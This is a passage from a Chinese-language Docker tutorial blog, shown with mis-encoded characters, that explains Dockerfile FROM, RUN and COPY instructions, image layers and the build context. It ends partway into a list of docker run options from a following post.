Dockerfileï¼š $ mkdir mynginx $ cd mynginx $ touch Dockerfile å…¶å†…å®¹ä¸ºï¼š FROM nginx RUN echo '&lt;h1>Hello, Docker!&lt;/h1>' > /usr/share/nginx/html/index.html è¿™ä¸ª Dockerfile å¾ˆç®€å•ï¼Œä¸€å…±å°±ä¸¤è¡Œã€‚æ¶‰åŠåˆ°äº†ä¸¤æ¡æŒ‡ä»¤ï¼ŒFROM å’Œ RUNã€‚ FROM FROM å°±æ˜¯æŒ‡å®š åŸºç¡€é•œåƒï¼Œå› æ­¤ä¸€ä¸ª Dockerfile ä¸­ FROM æ˜¯å¿…å¤‡çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚ FROM XXX ... åœ¨ Docker Hub ä¸Šæœ‰éå¸¸å¤šçš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œæœ‰å¯ä»¥ç›´æ¥æ‹¿æ¥ä½¿ç”¨çš„æœåŠ¡ç±»çš„é•œåƒï¼Œå¦‚ nginxã€redisã€mongoã€mysqlã€httpdã€phpã€tomcat ç­‰ï¼›ä¹Ÿæœ‰ä¸€äº›æ–¹ä¾¿å¼€å‘ã€æ„å»ºã€è¿è¡Œå„ç§è¯­è¨€åº”ç”¨çš„é•œåƒï¼Œå¦‚ nodeã€openjdkã€pythonã€rubyã€golang ç­‰ã€‚å¯ä»¥åœ¨å…¶ä¸­å¯»æ‰¾ä¸€ä¸ªæœ€ç¬¦åˆæˆ‘ä»¬æœ€ç»ˆç›®æ ‡çš„é•œåƒä¸ºåŸºç¡€é•œåƒè¿›è¡Œå®šåˆ¶ã€‚ å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”æœåŠ¡çš„é•œåƒï¼Œå®˜æ–¹é•œåƒä¸­è¿˜æä¾›äº†ä¸€äº›æ›´ä¸ºåŸºç¡€çš„æ“ä½œç³»ç»Ÿé•œåƒï¼Œå¦‚ ubuntuã€debianã€centosã€fedoraã€alpine ç­‰ï¼Œè¿™äº›æ“ä½œç³»ç»Ÿçš„è½¯ä»¶åº“ä¸ºæˆ‘ä»¬æä¾›äº†æ›´å¹¿é˜”çš„æ‰©å±•ç©ºé—´ã€‚ RUN æ‰§è¡Œå‘½ä»¤ RUN æŒ‡ä»¤æ˜¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤çš„ã€‚ç”±äºå‘½ä»¤è¡Œçš„å¼ºå¤§èƒ½åŠ›ï¼ŒRUN æŒ‡ä»¤åœ¨å®šåˆ¶é•œåƒæ—¶æ˜¯æœ€å¸¸ç”¨çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚å…¶æ ¼å¼æœ‰ä¸¤ç§ï¼š shell æ ¼å¼ï¼šRUN &lt;å‘½ä»¤&gt;ï¼Œå°±åƒç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‘½ä»¤ä¸€æ ·ã€‚åˆšæ‰å†™çš„ Dockerfile ä¸­çš„ RUN æŒ‡ä»¤å°±æ˜¯è¿™ç§æ ¼å¼ã€‚ RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html exec æ ¼å¼ï¼šRUN [&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;, &quot;å‚æ•°1&quot;, &quot;å‚æ•°2&quot;]ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚ æ—¢ç„¶ RUN å°±åƒ Shell è„šæœ¬ä¸€æ ·å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å°±å¯ä»¥åƒ Shell è„šæœ¬ä¸€æ ·æŠŠæ¯ä¸ªå‘½ä»¤å¯¹åº”ä¸€ä¸ª RUN å‘¢ï¼Ÿæ¯”å¦‚è¿™æ ·ï¼š FROM debian:stretch RUN apt-get update RUN apt-get install -y gcc libc6-dev make wget RUN wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" RUN mkdir -p /usr/src/redisRUN tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 RUN make -C /usr/src/redis RUN make -C /usr/src/redis install ä¹‹å‰è¯´è¿‡ï¼ŒDockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼ŒRUN ä¹Ÿä¸ä¾‹å¤–ã€‚æ¯ä¸€ä¸ª RUN çš„è¡Œä¸ºï¼Œå°±å’Œåˆšæ‰æˆ‘ä»¬æ‰‹å·¥å»ºç«‹é•œåƒçš„è¿‡ç¨‹ä¸€æ ·ï¼šæ–°å»ºç«‹ä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œæ‰§è¡Œç»“æŸåï¼Œcommit è¿™ä¸€å±‚çš„ä¿®æ”¹ï¼Œæ„æˆæ–°çš„é•œåƒã€‚ è€Œä¸Šé¢çš„è¿™ç§å†™æ³•ï¼Œåˆ›å»ºäº† 7 å±‚é•œåƒã€‚è¿™æ˜¯å®Œå…¨æ²¡æœ‰æ„ä¹‰çš„ï¼Œè€Œä¸”å¾ˆå¤šè¿è¡Œæ—¶ä¸éœ€è¦çš„ä¸œè¥¿ï¼Œéƒ½è¢«è£…è¿›äº†é•œåƒé‡Œï¼Œæ¯”å¦‚ç¼–è¯‘ç¯å¢ƒã€æ›´æ–°çš„è½¯ä»¶åŒ…ç­‰ç­‰ã€‚ç»“æœå°±æ˜¯äº§ç”Ÿéå¸¸è‡ƒè‚¿ã€éå¸¸å¤šå±‚çš„é•œåƒï¼Œä¸ä»…ä»…å¢åŠ äº†æ„å»ºéƒ¨ç½²çš„æ—¶é—´ï¼Œä¹Ÿå¾ˆå®¹æ˜“å‡ºé”™ã€‚ è¿™æ˜¯å¾ˆå¤šåˆå­¦ Docker çš„äººå¸¸çŠ¯çš„ä¸€ä¸ªé”™è¯¯ã€‚ Union FS æ˜¯æœ‰æœ€å¤§å±‚æ•°é™åˆ¶çš„ï¼Œæ¯”å¦‚ AUFSï¼Œæ›¾ç»æ˜¯æœ€å¤§ä¸å¾—è¶…è¿‡ 42 å±‚ï¼Œç°åœ¨æ˜¯ä¸å¾—è¶…è¿‡ 127 å±‚ã€‚ ä¸Šé¢çš„ Dockerfile æ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯è¿™æ ·ï¼š Dickerfile FROM debian:stretch RUN set -x; buildDeps='gcc libc6-dev make wget' \\ &amp;&amp; apt-get update \\ &amp;&amp; apt-get install -y $buildDeps \\ &amp;&amp; wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" \\ &amp;&amp; mkdir -p /usr/src/redis \\ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\ &amp;&amp; make -C /usr/src/redis \\ &amp;&amp; make -C /usr/src/redis install \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; rm redis.tar.gz \\ &amp;&amp; rm -r /usr/src/redis \\ &amp;&amp; apt-get purge -y --auto-remove $buildDeps é¦–å…ˆï¼Œä¹‹å‰æ‰€æœ‰çš„å‘½ä»¤åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå°±æ˜¯ç¼–è¯‘ã€å®‰è£… redis å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤æ²¡æœ‰å¿…è¦å»ºç«‹å¾ˆå¤šå±‚ï¼Œè¿™åªæ˜¯ä¸€å±‚çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œè¿™é‡Œæ²¡æœ‰ä½¿ç”¨å¾ˆå¤šä¸ª RUN ä¸€ä¸€å¯¹åº”ä¸åŒçš„å‘½ä»¤ï¼Œè€Œæ˜¯ä»…ä»…ä½¿ç”¨ä¸€ä¸ª RUN æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨ &amp;&amp; å°†å„ä¸ªæ‰€éœ€å‘½ä»¤ä¸²è”èµ·æ¥ã€‚å°†ä¹‹å‰çš„ 7 å±‚ï¼Œç®€åŒ–ä¸ºäº† 1 å±‚ã€‚åœ¨æ’°å†™ Dockerfile çš„æ—¶å€™ï¼Œè¦ç»å¸¸æé†’è‡ªå·±ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨å†™ Shell è„šæœ¬ï¼Œè€Œæ˜¯åœ¨å®šä¹‰æ¯ä¸€å±‚è¯¥å¦‚ä½•æ„å»ºã€‚ å¹¶ä¸”ï¼Œè¿™é‡Œä¸ºäº†æ ¼å¼åŒ–è¿˜è¿›è¡Œäº†æ¢è¡Œã€‚Dockerfile æ”¯æŒ Shell ç±»çš„è¡Œå°¾æ·»åŠ  \\ çš„å‘½ä»¤æ¢è¡Œæ–¹å¼ï¼Œä»¥åŠè¡Œé¦– # è¿›è¡Œæ³¨é‡Šçš„æ ¼å¼ã€‚è‰¯å¥½çš„æ ¼å¼ï¼Œæ¯”å¦‚æ¢è¡Œã€ç¼©è¿›ã€æ³¨é‡Šç­‰ï¼Œä¼šè®©ç»´æŠ¤ã€æ’éšœæ›´ä¸ºå®¹æ˜“ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ä¹ æƒ¯ã€‚ æ­¤å¤–ï¼Œè¿˜å¯ä»¥çœ‹åˆ°è¿™ä¸€ç»„å‘½ä»¤çš„æœ€åæ·»åŠ äº†æ¸…ç†å·¥ä½œçš„å‘½ä»¤ï¼Œåˆ é™¤äº†ä¸ºäº†ç¼–è¯‘æ„å»ºæ‰€éœ€è¦çš„è½¯ä»¶ï¼Œæ¸…ç†äº†æ‰€æœ‰ä¸‹è½½ã€å±•å¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ¸…ç†äº† apt ç¼“å­˜æ–‡ä»¶ã€‚è¿™æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œé•œåƒæ˜¯å¤šå±‚å­˜å‚¨ï¼Œæ¯ä¸€å±‚çš„ä¸œè¥¿å¹¶ä¸ä¼šåœ¨ä¸‹ä¸€å±‚è¢«åˆ é™¤ï¼Œä¼šä¸€ç›´è·Ÿéšç€é•œåƒã€‚å› æ­¤é•œåƒæ„å»ºæ—¶ï¼Œä¸€å®šè¦ç¡®ä¿æ¯ä¸€å±‚åªæ·»åŠ çœŸæ­£éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•æ— å…³çš„ä¸œè¥¿éƒ½åº”è¯¥æ¸…ç†æ‰ã€‚ å¾ˆå¤šäººåˆå­¦ Docker åˆ¶ä½œå‡ºäº†å¾ˆè‡ƒè‚¿çš„é•œåƒçš„åŸå› ä¹‹ä¸€ï¼Œå°±æ˜¯å¿˜è®°äº†æ¯ä¸€å±‚æ„å»ºçš„æœ€åä¸€å®šè¦æ¸…ç†æ‰æ— å…³æ–‡ä»¶ã€‚ æ„å»ºé•œåƒ å¥½äº†ï¼Œè®©æˆ‘ä»¬å†å›åˆ°ä¹‹å‰å®šåˆ¶çš„ nginx é•œåƒçš„ Dockerfile æ¥ã€‚ç°åœ¨æˆ‘ä»¬æ˜ç™½äº†è¿™ä¸ª Dockerfile çš„å†…å®¹ï¼Œé‚£ä¹ˆè®©æˆ‘ä»¬æ¥æ„å»ºè¿™ä¸ªé•œåƒå§ã€‚ åœ¨ Dockerfile æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š $ docker build -t nginx:v3 . Sending build context to Docker daemon 2.048 kB Step 1 : FROM nginx ---> e43d811ce2f4 Step 2 : RUN echo '&lt;h1>Hello, Docker!&lt;/h1>' > /usr/share/nginx/html/index.html ---> Running in 9cdc27646c7b ---> 44aa4490ce2c Removing intermediate container 9cdc27646c7b Successfully built 44aa4490ce2c ä»å‘½ä»¤çš„è¾“å‡ºç»“æœä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°é•œåƒçš„æ„å»ºè¿‡ç¨‹ã€‚åœ¨ Step 2 ä¸­ï¼Œå¦‚åŒæˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„é‚£æ ·ï¼ŒRUN æŒ‡ä»¤å¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ 9cdc27646c7bï¼Œæ‰§è¡Œäº†æ‰€è¦æ±‚çš„å‘½ä»¤ï¼Œå¹¶æœ€åæäº¤äº†è¿™ä¸€å±‚ 44aa4490ce2cï¼Œéšååˆ é™¤äº†æ‰€ç”¨åˆ°çš„è¿™ä¸ªå®¹å™¨ 9cdc27646c7bã€‚ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† docker build å‘½ä»¤è¿›è¡Œé•œåƒæ„å»ºã€‚å…¶æ ¼å¼ä¸ºï¼š docker build [é€‰é¡¹] &lt;ä¸Šä¸‹æ–‡è·¯å¾„/URL/-> åœ¨è¿™é‡Œæˆ‘ä»¬æŒ‡å®šäº†æœ€ç»ˆé•œåƒçš„åç§° -t nginx:v3ï¼Œæ„å»ºæˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥åƒä¹‹å‰è¿è¡Œ nginx:v2 é‚£æ ·æ¥è¿è¡Œè¿™ä¸ªé•œåƒï¼Œå…¶ç»“æœä¼šå’Œ nginx:v2 ä¸€æ ·ã€‚ é•œåƒæ„å»ºä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ å¦‚æœæ³¨æ„ï¼Œä¼šçœ‹åˆ° docker build å‘½ä»¤æœ€åæœ‰ä¸€ä¸ª .ã€‚. è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œè€Œ Dockerfile å°±åœ¨å½“å‰ç›®å½•ï¼Œå› æ­¤ä¸å°‘åˆå­¦è€…ä»¥ä¸ºè¿™ä¸ªè·¯å¾„æ˜¯åœ¨æŒ‡å®š Dockerfile æ‰€åœ¨è·¯å¾„ï¼Œè¿™ä¹ˆç†è§£å…¶å®æ˜¯ä¸å‡†ç¡®çš„ã€‚å¦‚æœå¯¹åº”ä¸Šé¢çš„å‘½ä»¤æ ¼å¼ï¼Œä½ å¯èƒ½ä¼šå‘ç°ï¼Œè¿™æ˜¯åœ¨æŒ‡å®š ä¸Šä¸‹æ–‡è·¯å¾„ã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸Šä¸‹æ–‡å‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬è¦ç†è§£ docker build çš„å·¥ä½œåŸç†ã€‚Docker åœ¨è¿è¡Œæ—¶åˆ†ä¸º Docker å¼•æ“ï¼ˆä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼‰å’Œå®¢æˆ·ç«¯å·¥å…·ã€‚Docker çš„å¼•æ“æä¾›äº†ä¸€ç»„ REST APIï¼Œè¢«ç§°ä¸º Docker Remote APIï¼Œè€Œå¦‚ docker å‘½ä»¤è¿™æ ·çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œåˆ™æ˜¯é€šè¿‡è¿™ç»„ API ä¸ Docker å¼•æ“äº¤äº’ï¼Œä»è€Œå®Œæˆå„ç§åŠŸèƒ½ã€‚å› æ­¤ï¼Œè™½ç„¶è¡¨é¢ä¸Šæˆ‘ä»¬å¥½åƒæ˜¯åœ¨æœ¬æœºæ‰§è¡Œå„ç§ docker åŠŸèƒ½ï¼Œä½†å®é™…ä¸Šï¼Œä¸€åˆ‡éƒ½æ˜¯ä½¿ç”¨çš„è¿œç¨‹è°ƒç”¨å½¢å¼åœ¨æœåŠ¡ç«¯ï¼ˆDocker å¼•æ“ï¼‰å®Œæˆã€‚ä¹Ÿå› ä¸ºè¿™ç§ C/S è®¾è®¡ï¼Œè®©æˆ‘ä»¬æ“ä½œè¿œç¨‹æœåŠ¡å™¨çš„ Docker å¼•æ“å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚ å½“æˆ‘ä»¬è¿›è¡Œé•œåƒæ„å»ºçš„æ—¶å€™ï¼Œå¹¶éæ‰€æœ‰å®šåˆ¶éƒ½ä¼šé€šè¿‡ RUN æŒ‡ä»¤å®Œæˆï¼Œç»å¸¸ä¼šéœ€è¦å°†ä¸€äº›æœ¬åœ°æ–‡ä»¶å¤åˆ¶è¿›é•œåƒï¼Œæ¯”å¦‚é€šè¿‡ COPY æŒ‡ä»¤ã€ADD æŒ‡ä»¤ç­‰ã€‚è€Œ docker build å‘½ä»¤æ„å»ºé•œåƒï¼Œå…¶å®å¹¶éåœ¨æœ¬åœ°æ„å»ºï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯ Docker å¼•æ“ä¸­æ„å»ºçš„ã€‚é‚£ä¹ˆåœ¨è¿™ç§å®¢æˆ·ç«¯/æœåŠ¡ç«¯çš„æ¶æ„ä¸­ï¼Œå¦‚ä½•æ‰èƒ½è®©æœåŠ¡ç«¯è·å¾—æœ¬åœ°æ–‡ä»¶å‘¢ï¼Ÿ è¿™å°±å¼•å…¥äº†ä¸Šä¸‹æ–‡çš„æ¦‚å¿µã€‚å½“æ„å»ºçš„æ—¶å€™ï¼Œç”¨æˆ·ä¼šæŒ‡å®šæ„å»ºé•œåƒä¸Šä¸‹æ–‡çš„è·¯å¾„ï¼Œdocker build å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ï¼Œç„¶åä¸Šä¼ ç»™ Docker å¼•æ“ã€‚è¿™æ · Docker å¼•æ“æ”¶åˆ°è¿™ä¸ªä¸Šä¸‹æ–‡åŒ…åï¼Œå±•å¼€å°±ä¼šè·å¾—æ„å»ºé•œåƒæ‰€éœ€çš„ä¸€åˆ‡æ–‡ä»¶ã€‚ å¦‚æœåœ¨ Dockerfile ä¸­è¿™ä¹ˆå†™ï¼š COPY ./package.json /app/ è¿™å¹¶ä¸æ˜¯è¦å¤åˆ¶æ‰§è¡Œ docker build å‘½ä»¤æ‰€åœ¨çš„ç›®å½•ä¸‹çš„ package.jsonï¼Œä¹Ÿä¸æ˜¯å¤åˆ¶ Dockerfile æ‰€åœ¨ç›®å½•ä¸‹çš„ package.jsonï¼Œè€Œæ˜¯å¤åˆ¶ ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰ ç›®å½•ä¸‹çš„ package.jsonã€‚ å› æ­¤ï¼ŒCOPY è¿™ç±»æŒ‡ä»¤ä¸­çš„æºæ–‡ä»¶çš„è·¯å¾„éƒ½æ˜¯**ç›¸å¯¹è·¯å¾„ã€‚**è¿™ä¹Ÿæ˜¯åˆå­¦è€…ç»å¸¸ä¼šé—®çš„ä¸ºä»€ä¹ˆ COPY ../package.json /app æˆ–è€… COPY /opt/xxxx /app æ— æ³•å·¥ä½œçš„åŸå› ï¼Œå› ä¸ºè¿™äº›è·¯å¾„å·²ç»è¶…å‡ºäº†ä¸Šä¸‹æ–‡çš„èŒƒå›´ï¼ŒDocker å¼•æ“æ— æ³•è·å¾—è¿™äº›ä½ç½®çš„æ–‡ä»¶ã€‚å¦‚æœçœŸçš„éœ€è¦é‚£äº›æ–‡ä»¶ï¼Œåº”è¯¥å°†å®ƒä»¬å¤åˆ¶åˆ°ä¸Šä¸‹æ–‡ç›®å½•ä¸­å»ã€‚ ç°åœ¨å°±å¯ä»¥ç†è§£åˆšæ‰çš„å‘½ä»¤ docker build -t nginx:v3 . ä¸­çš„è¿™ä¸ª .ï¼Œå®é™…ä¸Šæ˜¯åœ¨æŒ‡å®šä¸Šä¸‹æ–‡çš„ç›®å½•ï¼Œdocker build å‘½ä»¤ä¼šå°†è¯¥ç›®å½•ä¸‹çš„å†…å®¹æ‰“åŒ…äº¤ç»™ Docker å¼•æ“ä»¥å¸®åŠ©æ„å»ºé•œåƒã€‚ å¦‚æœè§‚å¯Ÿ docker build è¾“å‡ºï¼Œæˆ‘ä»¬å…¶å®å·²ç»çœ‹åˆ°äº†è¿™ä¸ªå‘é€ä¸Šä¸‹æ–‡çš„è¿‡ç¨‹ï¼š $ docker build -t nginx:v3 .Sending build context to Docker daemon 2.048 kB... ç†è§£æ„å»ºä¸Šä¸‹æ–‡å¯¹äºé•œåƒæ„å»ºæ˜¯å¾ˆé‡è¦çš„ï¼Œé¿å…çŠ¯ä¸€äº›ä¸åº”è¯¥çš„é”™è¯¯ã€‚æ¯”å¦‚æœ‰äº›åˆå­¦è€…åœ¨å‘ç° COPY /opt/xxxx /app ä¸å·¥ä½œåï¼Œäºæ˜¯å¹²è„†å°† Dockerfile æ”¾åˆ°äº†ç¡¬ç›˜æ ¹ç›®å½•å»æ„å»ºï¼Œç»“æœå‘ç° docker build æ‰§è¡Œåï¼Œåœ¨å‘é€ä¸€ä¸ªå‡ å GB çš„ä¸œè¥¿ï¼Œæä¸ºç¼“æ…¢è€Œä¸”å¾ˆå®¹æ˜“æ„å»ºå¤±è´¥ã€‚é‚£æ˜¯å› ä¸ºè¿™ç§åšæ³•æ˜¯åœ¨è®© docker build æ‰“åŒ…æ•´ä¸ªç¡¬ç›˜ï¼Œè¿™æ˜¾ç„¶æ˜¯ä½¿ç”¨é”™è¯¯ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œåº”è¯¥ä¼šå°† Dockerfile ç½®äºä¸€ä¸ªç©ºç›®å½•ä¸‹ï¼Œæˆ–è€…é¡¹ç›®æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœè¯¥ç›®å½•ä¸‹æ²¡æœ‰æ‰€éœ€æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠæ‰€éœ€æ–‡ä»¶å¤åˆ¶ä¸€ä»½è¿‡æ¥ã€‚å¦‚æœç›®å½•ä¸‹æœ‰äº›ä¸œè¥¿ç¡®å®ä¸å¸Œæœ›æ„å»ºæ—¶ä¼ ç»™ Docker å¼•æ“ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ .gitignore ä¸€æ ·çš„è¯­æ³•å†™ä¸€ä¸ª .dockerignoreï¼Œè¯¥æ–‡ä»¶æ˜¯ç”¨äºå‰”é™¤ä¸éœ€è¦ä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™ Docker å¼•æ“çš„ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šæœ‰äººè¯¯ä»¥ä¸º . æ˜¯æŒ‡å®š Dockerfile æ‰€åœ¨ç›®å½•å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸é¢å¤–æŒ‡å®š Dockerfile çš„è¯ï¼Œä¼šå°†ä¸Šä¸‹æ–‡ç›®å½•ä¸‹çš„åä¸º Dockerfile çš„æ–‡ä»¶ä½œä¸º Dockerfileã€‚ è¿™åªæ˜¯é»˜è®¤è¡Œä¸ºï¼Œå®é™…ä¸Š Dockerfile çš„æ–‡ä»¶åå¹¶ä¸è¦æ±‚å¿…é¡»ä¸º Dockerfileï¼Œè€Œä¸”å¹¶ä¸è¦æ±‚å¿…é¡»ä½äºä¸Šä¸‹æ–‡ç›®å½•ä¸­ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ -f ../Dockerfile.php å‚æ•°æŒ‡å®šæŸä¸ªæ–‡ä»¶ä½œä¸º Dockerfileã€‚ å½“ç„¶ï¼Œä¸€èˆ¬å¤§å®¶ä¹ æƒ¯æ€§çš„ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶å Dockerfileï¼Œä»¥åŠä¼šå°†å…¶ç½®äºé•œåƒæ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ã€‚ COPY å¤åˆ¶æ–‡ä»¶ æ ¼å¼ï¼š COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;æºè·¯å¾„&gt;... &lt;ç›®æ ‡è·¯å¾„&gt; COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;æºè·¯å¾„1&gt;&quot;,... &quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;] å’Œ RUN æŒ‡ä»¤ä¸€æ ·ï¼Œä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§ç±»ä¼¼äºå‘½ä»¤è¡Œï¼Œä¸€ç§ç±»ä¼¼äºå‡½æ•°è°ƒç”¨ã€‚ COPY æŒ‡ä»¤å°†ä»æ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ &lt;æºè·¯å¾„&gt; çš„æ–‡ä»¶/ç›®å½•å¤åˆ¶åˆ°æ–°çš„ä¸€å±‚çš„é•œåƒå†…çš„ &lt;ç›®æ ‡è·¯å¾„&gt; ä½ç½®ã€‚æ¯”å¦‚ï¼š COPY package.json /usr/src/app/ &lt;æºè·¯å¾„&gt; å¯ä»¥æ˜¯å¤šä¸ªï¼Œç”šè‡³å¯ä»¥æ˜¯é€šé…ç¬¦ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³ Go çš„ filepath.Match è§„åˆ™ï¼Œå¦‚ï¼š COPY hom* /mydir/COPY hom?.txt /mydir/ &lt;ç›®æ ‡è·¯å¾„&gt; å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼ˆå·¥ä½œç›®å½•å¯ä»¥ç”¨ WORKDIR æŒ‡ä»¤æ¥æŒ‡å®šï¼‰ã€‚ç›®æ ‡è·¯å¾„ä¸éœ€è¦äº‹å…ˆåˆ›å»ºï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ä¼šåœ¨å¤åˆ¶æ–‡ä»¶å‰å…ˆè¡Œåˆ›å»ºç¼ºå¤±ç›®å½•ã€‚ æ­¤å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œä½¿ç”¨ COPY æŒ‡ä»¤ï¼Œæºæ–‡ä»¶çš„å„ç§å…ƒæ•°æ®éƒ½ä¼šä¿ç•™ã€‚æ¯”å¦‚è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å˜æ›´æ—¶é—´ç­‰ã€‚è¿™ä¸ªç‰¹æ€§å¯¹äºé•œåƒå®šåˆ¶å¾ˆæœ‰ç”¨ã€‚ç‰¹åˆ«æ˜¯æ„å»ºç›¸å…³æ–‡ä»¶éƒ½åœ¨ä½¿ç”¨ Git è¿›è¡Œç®¡ç†çš„æ—¶å€™ã€‚ åœ¨ä½¿ç”¨è¯¥æŒ‡ä»¤çš„æ—¶å€™è¿˜å¯ä»¥åŠ ä¸Š --chown=&lt;user&gt;:&lt;group&gt; é€‰é¡¹æ¥æ”¹å˜æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åŠæ‰€å±ç»„ã€‚ COPY --chown=55:mygroup files* /mydir/COPY --chown=bin files* /mydir/COPY --chown=1 files* /mydir/COPY --chown=10:11 files* /mydir/ å¦‚æœæºè·¯å¾„ä¸ºæ–‡ä»¶å¤¹ï¼Œå¤åˆ¶çš„æ—¶å€™ä¸æ˜¯ç›´æ¥å¤åˆ¶è¯¥æ–‡ä»¶å¤¹ï¼Œè€Œæ˜¯å°†æ–‡ä»¶å¤¹ä¸­çš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡è·¯å¾„ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/tags/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"}],"author":"sizaif"},{"title":"Docker Tutorial","slug":"Docker-Tutorial","date":"2021-08-10T05:17:05.000Z","updated":"2021-09-19T10:15:14.432Z","comments":true,"path":"posts/ac15f71a/","link":"","permalink":"https://www.sizaif.com/posts/ac15f71a/","excerpt":"","text":"Docker Tutorial ğŸ˜„ @Auther: sizaif ğŸ“† 2021-06-08 15:38:53 [TOC] docker docs https://docs.docker.com/get-docker/ Install Docker Desktop for Windows https://docs.docker.com/docker-for-windows/install/ overview Commands https://docs.docker.com/engine/reference/commandline/cli/ Build $ docker build [OPTIONS] PATH | URL | - Run Usage $ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] Options options Name, shorthandDefaultDescription--add-hostAdd a custom host-to-IP mapping (host:ip)--attach , -aAttach to STDIN, STDOUT or STDERR--blkio-weightBlock IO (relative weight), between 10 and 1000, or 0 to disable (default 0)--blkio-weight-deviceBlock IO weight (relative device weight)--cap-addAdd Linux capabilities--cap-dropDrop Linux capabilities--cgroup-parentOptional parent cgroup for the container--cgroupnsAPI 1.41+ Cgroup namespace to use (host|private) â€˜hostâ€™: Run the container in the Docker 